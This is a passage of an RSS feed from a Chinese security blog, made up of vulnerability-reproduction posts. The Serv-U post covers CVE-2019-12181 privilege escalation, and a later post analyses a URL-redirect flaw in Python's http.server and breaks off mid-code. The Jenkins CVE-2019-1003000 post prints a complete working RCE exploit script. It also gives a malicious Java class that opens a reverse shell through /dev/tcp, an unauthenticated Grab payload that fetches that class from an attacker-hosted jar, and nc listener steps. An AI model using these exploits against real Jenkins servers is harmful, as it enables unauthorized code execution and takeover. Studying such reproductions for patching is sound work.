    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />    <label for="pass">您好, 这里需要密码.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      hexo 加密测试， 密码:demos.
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="phpstudy" scheme="https://www.lsowl.top/tags/phpstudy/"/>
    
  </entry>
  
  <entry>
    <title>PHP文件写入</title>
    <link href="https://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <id>https://www.lsowl.top/2019/09/28/PHP文件写入/</id>
    <published>2019-09-28T03:04:56.000Z</published>
    <updated>2019-09-28T08:11:01.203Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />    <label for="pass">您好, 这里需要密码.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      hexo 加密测试， 密码:demos.
    
    </summary>
    
      <category term="PHP基础" scheme="https://www.lsowl.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="PHP" scheme="https://www.lsowl.top/tags/PHP/"/>
    
      <category term="webshell写入" scheme="https://www.lsowl.top/tags/webshell%E5%86%99%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation本地提权漏洞复现</title>
    <link href="https://www.lsowl.top/2019/08/08/CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.lsowl.top/2019/08/08/CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation本地提权漏洞复现/</id>
    <published>2019-08-08T14:28:33.000Z</published>
    <updated>2019-11-08T14:30:17.725Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation本地提权漏洞复现"><a href="#CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation本地提权漏洞复现" class="headerlink" title="CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation本地提权漏洞复现"></a>CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation本地提权漏洞复现</h3><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a><strong>漏洞概述</strong></h3><p>Serv-U是Windows平台和Linux平台的安全FTP服务器（FTPS，SFTP，HTTPS），是一个优秀的，安全的文件管理，文件传输和文件共享的解决方案。同时也是应用最广泛的FTP服务器软件。</p><p>在近日，有安全研究人员公布了一个该软件15.1.6版本的一个本地权限提升漏洞。在Linux上，ftp服务器是SUID可执行文件并以root身份运行 因此，即使只能在本地执行的攻击仍然是一种威胁，因为它会为攻击者提供root权限。</p><p>漏洞原因在于代码中传递给系统的命令是“ chmod u + s <some filename> ”，其中<some filename>设置为argv [0]！这是危险的，因为如果我们设法达到这个易受攻击的流程，我们可以使用exec <em>函数之一（前面讨论过）控制argv [0]并实现代码执行！此外，由于可执行文件是SUID，即使我们从exec </em>函数运行它，它也将以root身份运行，为任何攻击用户提供root权限。</some></some></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h3><p>下载源码包：下载链接：https:<em>//hrtsea.com/224.html</em></p><p>在终端中直接安装，默认安装目录在/usr/local/Serv-U/中，启动环境之后，浏览器访问链接：http:<em>//ip:8080 即可访问Web管理界面。</em></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>在exploit-db中下载exp脚本：https:<em>//<a href="http://www.exploit-db.com/exploits/47009" target="_blank" rel="noopener">www.exploit-db.com/exploits/47009</a></em></p><p><code>sudo gcc cve-2019-12181.c -o exp &amp;&amp; ./exp</code></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h3><p>升级到最新15.1.6以上版本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation本地提权漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation本地提权漏洞复现&quot; clas
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="Serv-U 15.1.6" scheme="https://www.lsowl.top/tags/Serv-U-15-1-6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-1003000 Jenkins-PreAuth-RCE复现</title>
    <link href="https://www.lsowl.top/2019/07/28/CVE-2019-1003000-Jenkins-PreAuth-RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.lsowl.top/2019/07/28/CVE-2019-1003000-Jenkins-PreAuth-RCE复现/</id>
    <published>2019-07-28T12:22:50.000Z</published>
    <updated>2019-10-28T12:24:26.056Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2019-1003000-Jenkins-PreAuth-RCE-复现"><a href="#CVE-2019-1003000-Jenkins-PreAuth-RCE-复现" class="headerlink" title="CVE-2019-1003000 Jenkins-PreAuth-RCE 复现"></a>CVE-2019-1003000 Jenkins-PreAuth-RCE 复现</h3><h3 id="分为前台getshell和后台getshell"><a href="#分为前台getshell和后台getshell" class="headerlink" title="分为前台getshell和后台getshell"></a>分为前台getshell和后台getshell</h3><p>前台getshell是在知道Jenkins登录密码时利用exp进行getshell，后台getshell利用orange大佬的思路进行getshell（实际中测试较少）</p><h3 id="前台getshell复现"><a href="#前台getshell复现" class="headerlink" title="前台getshell复现"></a>前台getshell复现</h3><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码<br>CVE-2019-1003000 (Script Security)<br>CVE-2019-1003001 (Pipeline: Groovy)<br>CVE-2019-1003002 (Pipeline: Declarative)</p><h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Pipeline: Declarative Plugin up to and including 1.3.4<br>Pipeline: Groovy Plugin up to and including 2.61<br>Script Security Plugin up to and including 1.49</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>复现漏洞CVE-2019-1003000 (Script Security)<br>测试环境需要安装docker</p><p>git clone <a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git" target="_blank" rel="noopener">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</a><br>cd cve-2019-1003000-jenkins-rce-poc<br>pip install -r requirements.txt<br>cd sample-vuln<br>./run.sh<br>cd ../<br>python exploit.py –url <a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080</a> –job my-pipeline –username user1 –password user1 –cmd “cat /etc/passwd”<br>环境搭建好后，已经创建好了帐号密码 user1 user1<br>以及创建了一个任务 my-pipeline<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716774.65.png" alt></p><p>执行payload</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716806.59.png" alt></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Author: Adam Jordan</span></span><br><span class="line"><span class="comment"># Date: 2019-02-15</span></span><br><span class="line"><span class="comment"># Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span></span><br><span class="line"><span class="comment"># PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> jenkins</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> xml.etree <span class="keyword">import</span> ElementTree</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">import org.buildobjects.process.ProcBuilder</span></span><br><span class="line"><span class="string">@Grab('org.buildobjects:jproc:2.2.3')</span></span><br><span class="line"><span class="string">class Dummy&#123; &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">print new ProcBuilder("/bin/bash").withArgs("-c","%s").run().getOutputString()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(url, cmd, job_name, username, password)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] connecting to jenkins...'</span></span><br><span class="line">    <span class="comment"># 连接jenkins服务器</span></span><br><span class="line">    server = jenkins.Jenkins(url, username, password)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] crafting payload...'</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;?xml version="1.1" encoding="UTF-8"?&gt;&lt;flow-definition plugin="workflow-job@2.31"&gt;</span></span><br><span class="line"><span class="string">  &lt;actions/&gt;</span></span><br><span class="line"><span class="string">  &lt;description/&gt;</span></span><br><span class="line"><span class="string">  &lt;keepDependencies&gt;false&lt;/keepDependencies&gt;</span></span><br><span class="line"><span class="string">  &lt;properties/&gt;</span></span><br><span class="line"><span class="string">&lt;definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.63"&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;node &#123;</span></span><br><span class="line"><span class="string">   echo 'Hello World'</span></span><br><span class="line"><span class="string">    &#125;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;sandbox&gt;true&lt;/sandbox&gt;</span></span><br><span class="line"><span class="string">  &lt;/definition&gt;</span></span><br><span class="line"><span class="string">  &lt;triggers/&gt;</span></span><br><span class="line"><span class="string">  &lt;disabled&gt;false&lt;/disabled&gt;</span></span><br><span class="line"><span class="string">    &lt;/flow-definition&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#得到job的配置文件 如上</span></span><br><span class="line">    ori_job_config = server.get_job_config(job_name)</span><br><span class="line">    et = ElementTree.fromstring(ori_job_config)</span><br><span class="line">    <span class="keyword">print</span> et</span><br><span class="line">    et.find(<span class="string">'definition/script'</span>).text = payload % cmd</span><br><span class="line">    job_config = ElementTree.tostring(et, encoding=<span class="string">'utf8'</span>, method=<span class="string">'xml'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] modifying job with payload...'</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;?xml version='1.0' encoding='utf8'?&gt;</span></span><br><span class="line"><span class="string">&lt;flow-definition plugin="workflow-job@2.31"&gt;</span></span><br><span class="line"><span class="string">  &lt;actions /&gt;</span></span><br><span class="line"><span class="string">  &lt;description /&gt;</span></span><br><span class="line"><span class="string">  &lt;keepDependencies&gt;false&lt;/keepDependencies&gt;</span></span><br><span class="line"><span class="string">  &lt;properties /&gt;</span></span><br><span class="line"><span class="string">  &lt;definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.63"&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">import org.buildobjects.process.ProcBuilder</span></span><br><span class="line"><span class="string">@Grab('org.buildobjects:jproc:2.2.3')</span></span><br><span class="line"><span class="string">class Dummy&#123; &#125;</span></span><br><span class="line"><span class="string">print new ProcBuilder("/bin/bash").withArgs("-c","id").run().getOutputString()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;sandbox&gt;true&lt;/sandbox&gt;</span></span><br><span class="line"><span class="string">  &lt;/definition&gt;</span></span><br><span class="line"><span class="string">  &lt;triggers /&gt;</span></span><br><span class="line"><span class="string">  &lt;disabled&gt;false&lt;/disabled&gt;</span></span><br><span class="line"><span class="string">&lt;/flow-definition&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#修改后的job配置文件</span></span><br><span class="line">    server.reconfig_job(job_name, job_config)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] putting job build to queue...'</span></span><br><span class="line">    queue_number = server.build_job(job_name)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] waiting for job to build...'</span></span><br><span class="line">    queue_item_info = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="string">'executable'</span> <span class="keyword">not</span> <span class="keyword">in</span> queue_item_info:</span><br><span class="line">        queue_item_info = server.get_queue_item(queue_number)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] restoring job...'</span></span><br><span class="line">    server.reconfig_job(job_name, ori_job_config)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] fetching output...'</span></span><br><span class="line">    last_build_number = server.get_job_info(job_name)[<span class="string">'lastBuild'</span>][<span class="string">'number'</span>]</span><br><span class="line">    console_output = server.get_build_console_output(job_name, last_build_number)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] OUTPUT:'</span></span><br><span class="line">    <span class="keyword">print</span> console_output</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Jenkins RCE'</span>)</span><br><span class="line"> </span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, help=<span class="string">'target jenkins url'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--cmd'</span>, help=<span class="string">'system command to be run'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--job'</span>, help=<span class="string">'job name'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--username'</span>, help=<span class="string">'username'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--password'</span>, help=<span class="string">'password'</span>)</span><br><span class="line"> </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    run_command(args.url, args.cmd, args.job, args.username, args.password)</span><br></pre></td></tr></table></figure><p>首先从jenkins获取job my-pipeline的配置文件，然后将payload写入配置文件，重新构建job.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">import org.buildobjects.process.ProcBuilder</span></span><br><span class="line"><span class="string">@Grab('</span>org.buildobjects:jproc:<span class="number">2.2</span>.3<span class="string">')</span></span><br><span class="line"><span class="string">class Dummy&#123; &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">print new ProcBuilder("/bin/bash").withArgs("-c","%s").run().getOutputString()</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br></pre></td></tr></table></figure><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>更新升级组件到安全版本<br>Pipeline: Declarative Plugin should be updated to version 1.3.4.1<br>Pipeline: Groovy Plugin should be updated to version 2.61.1<br>Script Security Plugin should be updated to version 1.50</p><h3 id="后台getshell复现（实测中没有遇见，参考复现成功的文章）"><a href="#后台getshell复现（实测中没有遇见，参考复现成功的文章）" class="headerlink" title="后台getshell复现（实测中没有遇见，参考复现成功的文章）"></a>后台getshell复现（实测中没有遇见，参考复现成功的文章）</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前几天听小伙伴说 Jenkins 出了个 RCE 我以为是说之前那个需要登录后才能 RCE的漏洞 。但结果小伙伴说这次这个不用登录就能 RCE 是 Orange 大佬发的，激动了一下，因为最近遇到了好几个Jenkins的站，正发愁呢… 于是去Orange 大佬的博客看过程，大佬写的漏洞原理，复现过程，到POC验证 都很详细，墙力推荐。</p><p>有兴趣的可以移步去观看：<a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/" target="_blank" rel="noopener">https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</a></p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>复现需要自己本地编写一个恶意的Testjk.java文件然后打包成 jar 上传至目标能够请求到的地方 如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Testjk</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Testjk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String payload = <span class="string">"bash -i &gt;&amp; /dev/tcp/0.0.0.0/1234 0&gt;&amp;1 &amp;"</span>;</span><br><span class="line">      String[] cmds = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, payload &#125;;</span><br><span class="line">      java.lang.Runtime.getRuntime().exec(cmds);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行 执行 javac Testjk.java 生成 Testjk.class</p><p>创建文件夹  mkdir -p META-INF/services/</p><p>然后将要执行的类名写入到 META-INF/services/org.codehaus.groovy.plugins.Runners 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Testjk &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716314.22.png" alt></p><p>打包成 jar<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716337.2.png" alt></p><p>然后将此恶意 jar 放到目标站能够请求到地方，放自己的公网 主机或者shell都可以</p><p>在公网主机的web根目录下创建文件夹 /tools/jenkins/1</p><p>然后将恶意的 jar 包放入此目录</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716360.07.png" alt></p><p>访问目标 是否存在此目录 /securityRealm/user/admin/<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716403.52.png" alt></p><p>Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile</span><br><span class="line">?value=</span><br><span class="line"><span class="meta">@GrabConfig</span>(disableChecksums=<span class="keyword">true</span>)%<span class="number">0</span>a</span><br><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">'payload'</span>, root=<span class="string">'http://你的地址/'</span>)%<span class="number">0</span>a</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">'tools'</span>, <span class="keyword">module</span>=<span class="string">'jenkins'</span>, version=<span class="string">'1'</span>)%<span class="number">0</span>a</span><br><span class="line"><span class="keyword">import</span> Testjk;</span><br></pre></td></tr></table></figure><p>本机监听端口  nc -lvp 1234</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716441.04.png" alt></p><p>然后靶机执行Payload<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716459.19.png" alt></p><p>目标的也执行了我们的反弹命令  nc 以上线<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716476.92.png" alt></p><p>此处我走过一个坑，就是如果你用payload去打目标并没有上线 但是看日志中却发现目标对你的jar 发起了请求，如果这时候你在执行第二次会发现他并不会再次发起请求 ，这是应为jenkins他只会拉一次 你的jar包，第二次是不会在拉的，所以执行第二次的时候需要修改目录和名字</p><p>还有一种是执行后爆这个   这是因为版本不一致导致的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1564716502.45.png" alt></p><h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>这个漏洞爆出来的时候就兴致勃勃的去复现，但是一直卡在了第一次请求有请求记录但反弹失败，第二次执行无请求记录这个地方，然后就没管了，今天突然想弄弄，找了些资料最终还是复现成功了，大概测了几个，成功的比较少，大多数没有  /securityRealm/user/admin/  页面，或者执行 Payload 回显 404 的比较多  直接反弹的很少，遇到过几个因为版本不一致报错的，这个只要换相同版本的java 生成jar就好了，都是些小问题。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.51cto.com/13770310/2352740" target="_blank" rel="noopener">https://blog.51cto.com/13770310/2352740</a></p><p><a href="http://r3start.net/index.php/2019/03/01/439" target="_blank" rel="noopener">http://r3start.net/index.php/2019/03/01/439</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2019-1003000-Jenkins-PreAuth-RCE-复现&quot;&gt;&lt;a href=&quot;#CVE-2019-1003000-Jenkins-PreAuth-RCE-复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-10030
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://www.lsowl.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="Jenkins" scheme="https://www.lsowl.top/tags/Jenkins/"/>
    
  </entry>
  
  <entry>
    <title>URL跳转漏洞白盒实践</title>
    <link href="https://www.lsowl.top/2018/11/21/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%99%BD%E7%9B%92%E5%AE%9E%E8%B7%B5/"/>
    <id>https://www.lsowl.top/2018/11/21/URL跳转漏洞白盒实践/</id>
    <published>2018-11-21T14:18:57.000Z</published>
    <updated>2019-11-08T14:34:12.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote><p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p></blockquote><h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul><li><p>python一键启动web服务器 <code>python -m http.server</code></p><p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p></li><li><p>http.server模块下包含几个类</p><ul><li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li><li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li><li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li><li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li></ul></li><li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt></p></li><li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p></li><li><p>分析SimpleHTTPRequestHandler类源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line"></span><br><span class="line">    <span 